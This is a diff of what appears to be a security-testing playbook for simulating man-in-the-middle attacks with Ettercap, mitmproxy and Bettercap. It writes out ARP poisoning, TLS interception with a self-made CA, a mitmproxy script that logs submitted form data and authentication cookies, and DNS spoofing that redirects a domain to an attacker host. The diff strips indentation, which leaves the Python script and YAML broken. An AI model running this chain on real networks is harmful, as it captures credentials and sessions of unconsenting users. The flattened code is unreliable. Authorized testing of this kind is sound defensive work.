@@ -1,10 +1,10 @@
 ---
 name: conducting-man-in-the-middle-attack-simulation
 description: 'Simulates man-in-the-middle attacks using Ettercap, mitmproxy, and Bettercap
-  in authorized environments to intercept, analyze, and modify network traffic for
-  testing encryption enforcement, certificate validation, and detection capabilities.
+ in authorized environments to intercept, analyze, and modify network traffic for
+ testing encryption enforcement, certificate validation, and detection capabilities.
 
-  '
+ '
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -62,7 +62,7 @@ sudo sysctl -w net.ipv4.conf.all.send_redirects=0
 # Generate a CA certificate for TLS interception
 openssl genrsa -out mitm-ca.key 4096
 openssl req -new -x509 -days 30 -key mitm-ca.key -out mitm-ca.crt \
-  -subj "/CN=MITM Test CA/O=Security Assessment/C=US"
+ -subj "/CN=MITM Test CA/O=Security Assessment/C=US"
 
 # Discover hosts on the target network
 sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; quit"
@@ -112,7 +112,7 @@ sudo bettercap -iface eth0
 ```bash
 # Start mitmproxy as transparent proxy
 sudo mitmproxy --mode transparent --set confdir=~/.mitmproxy \
-  --set ssl_insecure=true -w mitm_capture.flow
+ --set ssl_insecure=true -w mitm_capture.flow
 
 # Configure iptables to redirect traffic through mitmproxy
 sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
@@ -125,21 +125,21 @@ from mitmproxy import http
 import json
 
 def request(flow: http.HTTPFlow):
-    if flow.request.method == "POST":
-        content_type = flow.request.headers.get("content-type", "")
-        if "form" in content_type or "json" in content_type:
-            with open("captured_forms.log", "a") as f:
-                f.write(f"URL: {flow.request.pretty_url}\n")
-                f.write(f"Data: {flow.request.get_text()}\n")
-                f.write("---\n")
+ if flow.request.method == "POST":
+ content_type = flow.request.headers.get("content-type", "")
+ if "form" in content_type or "json" in content_type:
+ with open("captured_forms.log", "a") as f:
+ f.write(f"URL: {flow.request.pretty_url}\n")
+ f.write(f"Data: {flow.request.get_text()}\n")
+ f.write("---\n")
 
 def response(flow: http.HTTPFlow):
-    # Log authentication cookies
-    if "set-cookie" in flow.response.headers:
-        with open("captured_cookies.log", "a") as f:
-            f.write(f"URL: {flow.request.pretty_url}\n")
-            f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
-            f.write("---\n")
+ # Log authentication cookies
+ if "set-cookie" in flow.response.headers:
+ with open("captured_cookies.log", "a") as f:
+ f.write(f"URL: {flow.request.pretty_url}\n")
+ f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
+ f.write("---\n")
 PYEOF
 
 sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
@@ -151,9 +151,9 @@ sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
 # DNS spoofing with Ettercap
 sudo tee /etc/ettercap/etter.dns << 'EOF'
 # Redirect target domain to attacker's web server
-example.com      A   192.168.1.99
-*.example.com    A   192.168.1.99
-www.example.com  A   192.168.1.99
+example.com A 192.168.1.99
+*.example.com A 192.168.1.99
+www.example.com A 192.168.1.99
 EOF
 
 sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.50// /192.168.1.1//
